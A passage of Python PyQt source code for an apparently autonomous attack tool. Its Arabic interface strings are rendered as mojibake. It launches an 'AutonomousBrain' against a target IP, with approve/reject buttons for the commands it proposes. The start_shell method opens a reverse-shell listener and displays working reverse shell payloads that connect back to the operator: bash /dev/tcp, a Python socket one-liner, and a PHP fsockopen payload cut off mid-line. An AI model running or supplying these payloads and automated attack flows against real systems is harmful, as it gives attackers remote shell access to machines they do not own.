        self.console.setStyleSheet("""
            QTextEdit {
                background: #000;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                border: 1px solid #333;
            }
        """)
        tab_widget.addTab(self.console, "ğŸ“Ÿ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±")
        
        # ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        self.findings_text = QTextEdit()
        self.findings_text.setReadOnly(True)
        self.findings_text.setStyleSheet("background: #1a1a1a; color: white;")
        tab_widget.addTab(self.findings_text, "ğŸ¯ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ÙˆØ§Ù„Ø«ØºØ±Ø§Øª")
        
        # ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ø«ØºØ±Ø§Øª
        self.vuln_text = QTextEdit()
        self.vuln_text.setReadOnly(True)
        self.vuln_text.setStyleSheet("background: #1a1a1a; color: #ffaa00;")
        self.show_vulnerabilities()
        tab_widget.addTab(self.vuln_text, "ğŸ“š Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø«ØºØ±Ø§Øª")
        
        layout.addWidget(tab_widget)
        
        # ========== Ø´Ø±ÙŠØ· Ø§Ù„Ø­Ø§Ù„Ø© ==========
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("âœ… Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¹Ù…Ù„")
        
        # ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø«ÙŠÙ…
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0f0f0f;
            }
            QLabel {
                color: #e0e0e0;
            }
            QGroupBox {
                color: #e0e0e0;
                border: 1px solid #333;
                margin-top: 10px;
                padding-top: 10px;
            }
            QComboBox, QLineEdit {
                background: #1a1a1a;
                color: white;
                border: 1px solid #333;
                padding: 5px;
            }
            QTabWidget::pane {
                background: #1a1a1a;
                border: 1px solid #333;
            }
            QTabBar::tab {
                background: #1a1a1a;
                color: white;
                padding: 8px;
            }
            QTabBar::tab:selected {
                background: #8e44ad;
            }
        """)
        
    def start_attack(self):
        """Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ…"""
        ip = self.ip_input.text().strip()
        if not ip:
            QMessageBox.warning(self, "ØªØ­Ø°ÙŠØ±", "Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ IP Ø§Ù„Ù‡Ø¯Ù")
            return
            
        self.console.clear()
        self.findings_text.clear()
        self.start_btn.setEnabled(False)
        
        self.brain = AutonomousBrain(
            ip, 
            self.goal_combo.currentText(),
            self.mode_combo.currentText(),
            self.speed_combo.currentText()
        )
        
        self.brain.log_signal.connect(self.update_log)
        self.brain.ask_permission_signal.connect(self.ask_permission)
        self.brain.status_signal.connect(self.status_bar.showMessage)
        self.brain.finding_signal.connect(self.add_finding)
        
        self.brain.start()
        
    def ask_permission(self, cmd, reason, priority):
        """Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø£Ù…Ø±"""
        colors = {"Ø¹Ø§Ù„ÙŠØ©": "#ff4444", "Ù…ØªÙˆØ³Ø·Ø©": "#ffaa00", "Ù…Ù†Ø®ÙØ¶Ø©": "#00ff00"}
        color = colors.get(priority, "white")
        
        self.reason_label.setText(f"ğŸ’¡ {reason}")
        self.reason_label.setStyleSheet(f"color: {color}; font-weight: bold;")
        self.command_display.setText(cmd)
        self.approve_btn.setEnabled(True)
        self.reject_btn.setEnabled(True)
        
    def approve_command(self):
        """Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù…Ø±"""
        self.approve_btn.setEnabled(False)
        self.reject_btn.setEnabled(False)
        if self.brain:
            self.brain.approve_command()
            
    def reject_command(self):
        """Ø±ÙØ¶ Ø§Ù„Ø£Ù…Ø±"""
        self.approve_btn.setEnabled(False)
        self.reject_btn.setEnabled(False)
        if self.brain:
            self.brain.reject_command()
            
    def update_log(self, msg, color):
        """ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø´Ø§Ø´Ø©"""
        color_code = COLORS.get(color, color)
        self.console.append(f"<font color='{color_code}'>{msg}</font>")
        
    def add_finding(self, finding):
        """Ø¥Ø¶Ø§ÙØ© Ù†ØªÙŠØ¬Ø©"""
        color = "#ff4444" if finding.get("severity") == "CRITICAL" else "#ffaa00"
        text = f"""
        <div style="border: 1px solid {color}; margin: 5px; padding: 10px;">
            <h3 style="color: {color};">{finding['title']}</h3>
            <p>{finding.get('description', '')}</p>
            <pre style="background: #000; color: #0f0;">{finding.get('command', '')}</pre>
        </div>
        """
        self.findings_text.append(text)
        
    def start_shell(self):
        """Ø¨Ø¯Ø¡ Reverse Shell"""
        port, ok = QInputDialog.getInt(self, "Reverse Shell", "Ø£Ø¯Ø®Ù„ Ø§Ù„Ù…Ù†ÙØ°:", 4444, 1, 65535)
        if ok:
            def shell_callback(msg):
                self.update_log(f"[Shell] {msg}", "shell")
                
            self.shell_manager.start_listener(port, shell_callback)
            
            # Ø¹Ø±Ø¶ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø§Øª
            lhost = self.shell_manager.get_local_ip()
            payloads = QMessageBox()
            payloads.setWindowTitle("ğŸ¯ Reverse Shell Payloads")
            payloads.setText(f"""
            <b>IP Ø§Ù„Ù…Ø­Ù„ÙŠ:</b> {lhost}<br>
            <b>Ø§Ù„Ù…Ù†ÙØ°:</b> {port}<br><br>
            
            <b>Linux Bash:</b><br>
            <code>bash -i >& /dev/tcp/{lhost}/{port} 0>&1</code><br><br>
            
            <b>Linux Python:</b><br>
            <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code><br><br>
            
            <b>PHP:</b><br>
            <code>php -r '$sock=fsockopen("{lhost}",{port});
